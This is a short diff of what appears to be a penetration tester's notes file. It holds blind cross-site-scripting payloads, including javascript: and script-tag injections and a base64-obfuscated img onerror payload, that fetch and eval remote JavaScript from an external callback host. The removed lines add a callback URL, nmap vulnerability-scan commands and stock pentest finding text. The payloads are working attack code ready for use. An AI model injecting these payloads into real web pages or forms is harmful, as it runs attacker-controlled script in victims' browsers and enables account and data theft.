@@ -8,26 +8,3 @@ javascript:eval('var a=document.createElement('script');a.src='https://deadlyage
 <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//deadlyagent.bxss.in");a.send();</script>
 <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//deadlyagent.bxss.in");a.send();</script>
 <img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZGVhZGx5YWdlbnQuYnhzcy5pbiI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61;&#61 onerror=eval(atob(this.id))>
-<script src=https://deadlyagent.bxss.in></script>
-https://e5kmcagyqscb83fr25my5xz2etkk8awz.oastify.com
-nmap -p 443 -sV -sC --script "ssl-* and http-* and vuln" --script-args http.useragent="Mozilla/5.0",http.max-cache-size=100 --version-all -Pn -T4 -oA nmap_443_full <target>
-nmap -p 443 -sV --script ssl-enum-ciphers,ssl-cert,http-methods,http-headers,http-title,vulners -T4 -Pn <target>
-
-
-Its Important;-
-Avoid disclosing sensitive application details such as API endpoints, internal implementation notes, or technology stack information in publicly accessible documentation or responses
-
-It was found that the server supports vulnerable CBC-mode ciphers, which are susceptible to padding oracle attacks such as LUCKY13
-
-During active scanning, the test team identified several paths being disclosed, and upon validation, confirmed that the following path is accessible and exposes sensitive information.
-
-In the current scenario, the test team observed that the feedback submission endpoint accepts multiple rapid requests in quick succession without any throttling or restriction, indicating the absence of rate-limiting controls to prevent automated or abusive usage.
-
-
-
-
-
-
-
-
-
